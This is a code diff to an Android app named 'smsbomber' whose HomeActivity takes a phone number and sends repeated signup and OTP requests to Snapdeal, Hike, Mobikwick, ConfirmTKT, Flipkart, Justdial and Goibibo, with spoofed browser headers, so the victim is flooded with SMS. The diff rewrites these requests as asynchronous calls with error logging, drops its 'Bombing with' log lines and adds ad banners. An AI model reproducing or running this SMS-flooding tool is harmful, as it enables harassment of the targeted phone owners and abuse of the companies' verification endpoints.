@@ -3,7 +3,6 @@ package co.deucate.smsbomber;
 import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.database.Cursor;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -15,6 +14,8 @@ import android.provider.ContactsContract;
 import android.support.v7.app.AppCompatActivity;
 import android.text.Html;
 import android.text.TextUtils;
+import android.text.method.ScrollingMovementMethod;
+import android.util.Log;
 import android.view.Menu;
 import android.view.MenuInflater;
 import android.view.MenuItem;
@@ -24,7 +25,6 @@ import android.webkit.WebViewClient;
 import android.widget.EditText;
 import android.widget.LinearLayout;
 import android.widget.TextView;
-import android.widget.Toast;
 
 import com.afollestad.ason.Ason;
 import com.afollestad.bridge.Bridge;
@@ -37,10 +37,15 @@ import com.google.android.gms.ads.AdView;
 import com.google.android.gms.ads.InterstitialAd;
 import com.google.android.gms.ads.MobileAds;
 
+import java.io.IOException;
+
+import okhttp3.Call;
+import okhttp3.Callback;
 import okhttp3.MediaType;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.RequestBody;
+import okhttp3.Response;
 
 
 @SuppressWarnings("ALL")
@@ -71,19 +76,21 @@ public class HomeActivity extends AppCompatActivity {
             return;
         }
 
+        adRequest = new AdRequest.Builder().build();
+
         new Handler().postDelayed(new Runnable() {
             @Override
             public void run() {
-                if (interstitialAd.isLoaded()){
+                if (interstitialAd.isLoaded()) {
                     interstitialAd.show();
 
                     interstitialAd.loadAd(adRequest);
-                }else {
-                    addLog("#FFFF00","Wait for 10-15 second.");
+                } else {
+                    addLog("#FFFF00", "Wait for 10-15 second.");
                     interstitialAd.loadAd(adRequest);
                 }
             }
-        },30000);
+        }, 30000);
 
         new AwesomeNoticeDialog(this)
                 .setTitle("Warning")
@@ -103,8 +110,12 @@ public class HomeActivity extends AppCompatActivity {
                 .show();
 
         AdView adView = findViewById(R.id.mainBottomBannerAd);
-        adRequest = new AdRequest.Builder().build();
-        adView.loadAd(adRequest);
+        final AdRequest adRequest1 = new AdRequest.Builder().build();
+        adView.loadAd(adRequest1);
+
+        AdView adView1 = findViewById(R.id.mainTopBannerAd);
+        AdRequest adRequest2 = new AdRequest.Builder().build();
+        adView.loadAd(adRequest2);
 
         MobileAds.initialize(this, "ca-app-pub-8086732239748075~8890173650");
 
@@ -119,17 +130,18 @@ public class HomeActivity extends AppCompatActivity {
         mLogTV = findViewById(R.id.logTV);
 
         mLog = mLogTV.getText().toString();
+        mLogTV.setMovementMethod(new ScrollingMovementMethod());
+
 
         findViewById(R.id.mainOkBtn).setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 mPhoneNumber = mPhoneEt.getText().toString();
 
-                if (TextUtils.isEmpty(mPhoneNumber)){
-                    addLog("#FFFF00","Please enter mobile number");
+                if (TextUtils.isEmpty(mPhoneNumber)) {
+                    addLog("#FFFF00", "Please enter mobile number");
                     return;
                 }
-
 
 
                 if (!isNetworkAvailable()) {
@@ -178,7 +190,8 @@ public class HomeActivity extends AppCompatActivity {
 
             @Override
             public void onAdFailedToLoad(int errorCode) {
-                addLog("#FF0000", "Error : " + errorCode);
+                addLog("#FF0000", "Errorcode : " + errorCode);
+                interstitialAd.loadAd(adRequest);
             }
 
             @Override
@@ -255,7 +268,6 @@ public class HomeActivity extends AppCompatActivity {
                             public void run() {
                                 if (code == 200) {
                                     mStatusTV.setText("Snapdeal");
-                                    addLog("00AA00", "Bombing with Snapdeal");
                                 }
                             }
                         });
@@ -308,7 +320,6 @@ public class HomeActivity extends AppCompatActivity {
                                 mStatusTV.setText("Hike");
                                 if (code == 200) {
                                     mStatusTV.setText("Snapdeal");
-                                    addLog("00AA00", "Bombing with Hike");
                                 }
                             }
                         });
@@ -363,7 +374,6 @@ public class HomeActivity extends AppCompatActivity {
                                     mStatusTV.setText("Mobikwick");
                                     if (code == 200) {
                                         mStatusTV.setText("Snapdeal");
-                                        addLog("00AA00", "Bombing with Mobikwick");
                                     }
                                 }
                             });
@@ -409,8 +419,6 @@ public class HomeActivity extends AppCompatActivity {
                             webView.loadUrl("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + mPhoneNumber);
                             webView.setWebViewClient(new WebViewClient());
                             mStatusTV.setText("ConfirmTKT");
-                            addLog("00AA00", "Bombing with ConfirmTKT");
-
                         }
                     });
 
@@ -447,23 +455,14 @@ public class HomeActivity extends AppCompatActivity {
                     MediaType localMediaType = MediaType.parse("application/json; charset=utf-8");
                     OkHttpClient localOkHttpClient = new OkHttpClient();
                     RequestBody localRequestBody = RequestBody.create(localMediaType, "{\"loginId\":[\"+91" + mPhoneNumber + "\"],\"supportAllStates\":true}");
-                    localOkHttpClient.newCall(new Request.Builder().url("https://www.flipkart.com/api/6/user/signup/status")
-                            .post(localRequestBody).addHeader("host", "www.flipkart.com")
-                            .addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
-                            .addHeader("accept", "*/*")
-                            .addHeader("accept-language", "en-US,en;q=0.5")
-                            .addHeader("accept-encoding", "gzip, deflate, br")
-                            .addHeader("referer", "https://www.flipkart.com/")
-                            .addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop")
-                            .addHeader("content-type", "application/json")
-                            .addHeader("origin", "https://www.flipkart.com")
-                            .addHeader("content-length", "53").addHeader("connection", "keep-alive").build());
-
-                    runOnUiThread(new Runnable() {
-                        @Override
-                        public void run() {
-                            addLog("00AA00", "Bombing with Flipkart");
+                    localOkHttpClient.newCall(new Request.Builder().url("https://www.flipkart.com/api/6/user/signup/status").post(localRequestBody).addHeader("host", "www.flipkart.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.flipkart.com/").addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop").addHeader("content-type", "application/json").addHeader("origin", "https://www.flipkart.com").addHeader("content-length", "53").addHeader("connection", "keep-alive").build()).enqueue(new Callback()
+                    {
+                        public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+                            addLog("#FF0000","At flipkart: "+paramAnonymousIOException.getLocalizedMessage());
                         }
+
+                        public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse)
+                        {}
                     });
 
                 }
@@ -497,16 +496,14 @@ public class HomeActivity extends AppCompatActivity {
                 public void run() {
 
                     String str = "https://www.justdial.com/functions/ajxandroid.php?phn=" + mPhoneNumber + "&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile";
-                    new OkHttpClient().newCall(new Request.Builder().url(str)
-                            .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
-                            .build());
-
-                    runOnUiThread(new Runnable() {
-                        @Override
-                        public void run() {
-                            addLog("00AA00", "Bombing with Justdiel");
-
+                    new OkHttpClient().newCall(new Request.Builder().url(str).addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36").build()).enqueue(new Callback()
+                    {
+                        public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+                            addLog("#FF0000","At justdial: "+paramAnonymousIOException.getLocalizedMessage());
                         }
+
+                        public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse)
+                        {}
                     });
 
                 }
@@ -538,27 +535,19 @@ public class HomeActivity extends AppCompatActivity {
                 @Override
                 public void run() {
 
-                    OkHttpClient localOkHttpClient = new OkHttpClient();
-                    RequestBody localRequestBody = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=" + mPhoneNumber);
-                    localOkHttpClient.newCall(new Request.Builder().url("https://www.goibibo.com/common/downloadsms/")
-                            .post(localRequestBody).addHeader("host", "www.goibibo.com")
-                            .addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
-                            .addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
-                            .addHeader("accept-language", "en-US,en;q=0.5")
-                            .addHeader("accept-encoding", "gzip, deflate, br")
-                            .addHeader("referer", "https://www.goibibo.com/mobile/?sms=success")
-                            .addHeader("content-type", "application/x-www-form-urlencoded")
-                            .addHeader("content-length", "14")
-                            .addHeader("connection", "keep-alive")
-                            .addHeader("upgrade-insecure-requests", "1").build());
-
-                    runOnUiThread(new Runnable() {
-                        @Override
-                        public void run() {
-                            addLog("00AA00", "Bombing with Goibibo");
-
+                    OkHttpClient localOkHttpClient1 = new OkHttpClient();
+                    RequestBody localRequestBody1 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=" + mPhoneNumber);
+                    localOkHttpClient1.newCall(new Request.Builder().url("https://www.goibibo.com/common/downloadsms/").post(localRequestBody1).addHeader("host", "www.goibibo.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.goibibo.com/mobile/?sms=success").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("content-length", "14").addHeader("connection", "keep-alive").addHeader("upgrade-insecure-requests", "1").build()).enqueue(new Callback()
+                    {
+                        public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+                            addLog("#FF0000","At goibibo: "+paramAnonymousIOException.getLocalizedMessage());
                         }
+
+                        public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse)
+                        {}
                     });
+
+
                 }
             });
             mThread.start();
@@ -591,7 +580,7 @@ public class HomeActivity extends AppCompatActivity {
             }
 
             case R.id.menuWeb: {
-                addLog("#00FF00","Thank you for open my website. God bless you with 100 child.");
+                addLog("#00FF00", "Thank you for open my website. God bless you with 100 child.");
                 Intent intent = new Intent(Intent.ACTION_VIEW);
                 intent.setData(Uri.parse("https://deucate.com/"));
                 startActivity(intent);
@@ -615,8 +604,8 @@ public class HomeActivity extends AppCompatActivity {
                 interstitialAd.show();
                 interstitialAd.loadAd(adRequest);
 
-            }else {
-                addLog("#FFFF00","Wait for 10-15 second.");
+            } else {
+                addLog("#FFFF00", "Wait for 10-15 second.");
                 interstitialAd.loadAd(adRequest);
                 return;
             }
@@ -634,8 +623,8 @@ public class HomeActivity extends AppCompatActivity {
                 number = numberT.replaceAll(" ", "");
                 mPhoneNumber = number;
                 mPhoneEt.setText(number);
-            }else {
-                number = numberT.replaceAll(" ","");
+            } else {
+                number = numberT.replaceAll(" ", "");
                 mPhoneNumber = number;
                 mPhoneEt.setText(mPhoneNumber);
             }
